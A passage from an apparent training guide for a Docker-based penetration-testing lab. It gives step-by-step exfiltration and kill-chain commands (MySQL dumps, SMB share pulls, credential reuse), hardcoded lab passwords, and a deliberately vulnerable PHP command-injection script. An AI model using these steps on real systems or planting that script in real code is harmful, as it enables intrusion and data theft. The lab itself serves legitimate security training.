- DC contains domain user information

#### Phase 2: Database Exfiltration

```bash
# Connect to MySQL
mysql -h 10.10.20.60 -u root -prootpass123

# Extract sensitive config
SELECT * FROM webapp.config WHERE is_secret = TRUE;

# Export user table
SELECT * FROM webapp.users INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n';

# Or dump to local file
mysqldump -h 10.10.20.60 -u root -prootpass123 webapp users > /root/loot/users_dump.sql
```

#### Phase 3: File Server Exfiltration

```bash
# Access finance share (may contain sensitive documents)
smbclient //10.10.20.50/finance -U admin%admin123

smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Access hidden admin share
smbclient //10.10.20.50/admin$ -U admin%admin123
```

#### Phase 4: Collect Web Application Secrets

```bash
# Download exposed backup file
curl http://10.10.10.10/config/database.php.bak -o /root/loot/database.php.bak

# Examine contents
cat /root/loot/database.php.bak
```

#### Phase 5: Document and Secure Exfiltrated Data

```bash
# Review collected data
ls -la /root/loot/

# Create summary
cat << 'EOF' > /root/loot/inventory.txt
Exfiltrated Data Inventory
==========================
1. users_dump.sql - Database user credentials
2. database.php.bak - MySQL connection credentials
3. [files from SMB shares]
4. Domain user list
EOF
```

#### Validation Criteria

- [ ] Extracted database credentials from config table
- [ ] Dumped user table from MySQL
- [ ] Retrieved files from at least 2 SMB shares
- [ ] Obtained web application database configuration
- [ ] Created inventory of exfiltrated data

---

### Scenario 5: Full Kill Chain Demonstration

**Objective:** Execute a complete attack chain from initial reconnaissance to data exfiltration, simulating a realistic intrusion.

**Difficulty:** Level 4 (Mastery)

**Time Estimate:** 2-3 hours

#### Attack Narrative

You are conducting an authorized penetration test against TESTLAB Corporation. Your objectives are to:
1. Gain initial access to the network
2. Escalate privileges
3. Move laterally to critical systems
4. Exfiltrate sensitive business data
5. Demonstrate domain compromise

#### Phase 1: External Reconnaissance (15 minutes)

```bash
# Initial network scan from attacker position
nmap -sn 10.10.10.0/24

# Service enumeration
nmap -sV -sC -p- 10.10.10.10,10.10.10.20,10.10.10.30,10.10.10.40 -oN recon_results.txt

# DNS enumeration and zone transfer
dig @10.10.10.40 testlab.local AXFR

# Web application reconnaissance
nikto -h http://10.10.10.10 -o nikto_results.txt
dirb http://10.10.10.10 /root/wordlists/web-common.txt
```

#### Phase 2: Initial Access (20 minutes)

```bash
# Discover exposed credentials via web application
curl http://10.10.10.10/config/database.php.bak

# Use discovered credentials to access FTP
ftp 10.10.10.20
# admin:admin123

# Access MySQL with web credentials
mysql -h 10.10.20.60 -u webuser -pwebpass123

# Extract stored credentials from database
SELECT username, password FROM users;
```

#### Phase 3: Credential Collection (15 minutes)

Document all discovered credentials:
```
Service     | Username    | Password
------------|-------------|----------------
Web Admin   | admin       | admin123
FTP         | admin       | admin123
FTP         | backup      | backup2024
MySQL Root  | root        | rootpass123
MySQL Web   | webuser     | webpass123
```

#### Phase 4: Lateral Movement (30 minutes)

```bash
# Test credential reuse on SSH
ssh admin@10.10.20.111
# Success with admin:admin123

# From server, enumerate internal network
nmap -sn 10.10.20.0/24

# Access SMB server
smbclient -L //10.10.20.50 -U admin%admin123

# Mount interesting shares
smbclient //10.10.20.50/it -U admin%admin123
smb: \> dir
smb: \> get [interesting_file]
```

#### Phase 5: Domain Compromise (30 minutes)

```bash
# Enumerate domain controller
ldapsearch -x -h 10.10.20.5 -b "dc=testlab,dc=local"

# Test service account credentials
ssh svc_backup@10.10.20.5
# Password: BackupSvc123

# Extract domain information
cat /opt/ad/users.txt
cat /var/lib/samba/sysvol/testlab.local/scripts/*.bat
```

#### Phase 6: Data Exfiltration (20 minutes)

```bash
# Create loot directory
mkdir -p /root/loot/testlab

# Export MySQL data
mysqldump -h 10.10.20.60 -u root -prootpass123 webapp > /root/loot/testlab/webapp_full.sql

# Collect SMB data
smbclient //10.10.20.50/backup -U backup%backup2024 -c "recurse; prompt; mget *"

# Package for exfil
tar -czvf /root/loot/testlab_exfil.tar.gz /root/loot/testlab/
```

#### Phase 7: Reporting

Create executive summary documenting:
- Attack timeline
- Compromised systems
- Credentials obtained
- Data accessed
- Recommended remediations

#### Validation Criteria

- [ ] Completed external reconnaissance of all DMZ hosts
- [ ] Obtained initial access through web application vulnerability
- [ ] Discovered at least 5 valid credential pairs
- [ ] Moved laterally to at least 3 internal systems
- [ ] Accessed domain controller
- [ ] Exfiltrated data from database and file shares
- [ ] Created comprehensive attack report

---

## Part 6: Customization Guide

### Adding New Vulnerable Services

#### Step 1: Create Dockerfile

Create a new directory under `docker/` for your service:

```bash
mkdir -p /Users/ic/cptc11/docker/my-new-service
```

Create a Dockerfile:
```dockerfile
# /Users/ic/cptc11/docker/my-new-service/Dockerfile
FROM alpine:3.18

LABEL maintainer="CPTC11 Team"
LABEL description="Description of your vulnerable service"
LABEL cptc11.role="my-new-service"

# Install required packages
RUN apk add --no-cache \
    your-service-package \
    && rm -rf /var/cache/apk/*

# Configure intentional vulnerabilities
# (Add your configuration here)

# Expose required ports
EXPOSE 1234

# Health check
HEALTHCHECK --interval=30s --timeout=10s --retries=3 \
    CMD nc -z localhost 1234 || exit 1

CMD ["your-service-command"]
```

#### Step 2: Add to Docker Compose

Edit `/Users/ic/cptc11/docker/docker-compose.yml`:

```yaml
  my-new-service:
    build:
      context: ./my-new-service
      dockerfile: Dockerfile
    container_name: cptc11-my-new-service
    hostname: my-new-service
    networks:
      internal_network:
        ipv4_address: 10.10.20.200
    ports:
      - "1234:1234"
    environment:
      - SERVICE_USER=user
      - SERVICE_PASS=pass123
    labels:
      - "cptc11.role=my-new-service"
      - "cptc11.network=internal"
    restart: unless-stopped
```

#### Step 3: Update DNS Zone

Add entries to `/Users/ic/cptc11/docker/dns-server/config/zones/db.testlab.local`:

```
my-new-service  IN  A   10.10.20.200
myservice       IN  A   10.10.20.200
```

#### Step 4: Build and Test

```bash
cd /Users/ic/cptc11/docker
docker compose build my-new-service
docker compose up -d my-new-service
docker compose logs my-new-service
```

### Modifying Existing Containers

#### Adding New Users

For services with user accounts, modify the Dockerfile:

```dockerfile
# Add to FTP Dockerfile
RUN adduser -D -h /home/newuser newuser && echo "newuser:newpass123" | chpasswd
```

Or modify runtime environment variables in docker-compose.yml.

#### Changing Network Configuration

Modify network assignments in docker-compose.yml:

```yaml
  existing-service:
    networks:
      dmz_network:
        ipv4_address: 10.10.10.99
      internal_network:
        ipv4_address: 10.10.20.99
      management_network:  # Add new network
        ipv4_address: 10.10.30.99
```

#### Adding New Vulnerabilities

Example: Adding a vulnerable CGI script to web server:

1. Create the vulnerable script:
```php
<?php
// /Users/ic/cptc11/docker/vulnerable-web/www/cgi/exec.php
// WARNING: Intentionally vulnerable - command injection
$cmd = $_GET['cmd'];
system($cmd);
?>
```

2. Rebuild the container:
```bash
docker compose build vulnerable-web
docker compose up -d vulnerable-web
```

### Creating Custom Scenarios

#### Scenario Template

Create a new scenario document following this structure:

```markdown
## Scenario: [Name]

**Objective:** [Clear statement of goals]

**Difficulty:** Level [1-4]

**Prerequisites:** [Required prior knowledge or completed scenarios]

**Time Estimate:** [Expected duration]

### Background

[Narrative context for the scenario]

### Phase 1: [Phase Name]

[Instructions with commands and expected outputs]

### Phase 2: [Phase Name]

[Continue with additional phases]

### Validation Criteria

- [ ] [Specific, measurable outcomes]
- [ ] [...]

### Hints

**Hint 1:** [Subtle guidance]
**Hint 2:** [More specific guidance]
**Hint 3:** [Nearly complete solution]

### Solution (Instructor Only)

[Complete walkthrough of solution]
```

#### Environment Modifications for Scenarios

For scenarios requiring specific configurations:

1. Create scenario-specific docker-compose override:
```yaml
# docker-compose.scenario-x.yml
version: "3.8"

services:
  vulnerable-web:
    environment:
      - SCENARIO_MODE=advanced
      - DISABLE_FEATURE=true
```

2. Launch with override:
```bash
docker compose -f docker-compose.yml -f docker-compose.scenario-x.yml up -d
```

### Best Practices for Customization

1. **Document Changes:** Maintain a changelog of modifications
2. **Version Control:** Commit all customizations to git
3. **Test Thoroughly:** Verify changes work in isolation before integration
4. **Preserve Defaults:** Use override files rather than modifying base configurations
5. **Security Boundaries:** Ensure new vulnerabilities cannot escape container isolation
6. **Reset Capability:** Always maintain ability to return to known-good state

---

## Quick Reference

### Essential Commands

```bash
# Start environment
cd /Users/ic/cptc11/docker && docker compose up -d

# Stop environment
docker compose down

# Reset environment (removes all data)
docker compose down -v && docker compose up -d

# View logs
docker compose logs -f [service-name]

# Access attack platform
docker exec -it cptc11-attack-platform bash

# Check service status
docker compose ps
```

### Network Quick Reference

| Network | Subnet | Purpose |
|---------|--------|---------|
| DMZ | 10.10.10.0/24 | External-facing services |
| Internal | 10.10.20.0/24 | Corporate network |
| Management | 10.10.30.0/24 | Administrative access |

### Port Mapping Quick Reference

| Service | Host Port | Purpose |
|---------|-----------|---------|
| Web HTTP | 8080 | Web application |
| Web HTTPS | 8443 | Secure web |
| FTP | 2121 | File transfer |
| SMTP | 2525 | Mail relay |
| DNS | 5353 | Name resolution |
| SMB | 4445 | File sharing |
| MySQL | 3307 | Database |
| SSH | 2222 | Remote access |

---

## Appendix: Troubleshooting Reference

### Common Error Messages

| Error | Cause | Solution |
|-------|-------|----------|
| "port is already allocated" | Host port conflict | Stop conflicting service or change port mapping |
| "network not found" | Networks not created | Run `docker compose up -d` to create networks |
| "container exited with code 1" | Service failed to start | Check logs with `docker compose logs [service]` |
| "connection refused" | Service not ready | Wait for health check or restart container |
| "permission denied" | Volume permissions | Check volume ownership and permissions |

### Health Check Debugging

```bash
# Check health status
docker inspect --format='{{.State.Health.Status}}' cptc11-[service]

# View health check logs
docker inspect --format='{{range .State.Health.Log}}{{.Output}}{{end}}' cptc11-[service]
```

### Network Debugging

```bash
# List networks
docker network ls

# Inspect network
docker network inspect docker_dmz_network

# Test connectivity from container
docker exec cptc11-attack-platform ping -c 1 10.10.10.10

# View container IP addresses
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cptc11-[container]
```

---

**Document Version:** 1.0
**Last Updated:** 2026-01-10
**Author:** CPTC11 Training Development Team

**DISCLAIMER:** This lab environment contains intentionally vulnerable services for authorized security testing and training purposes only. Never deploy these containers on production networks or expose them to untrusted systems. Use responsibly and only with proper authorization.
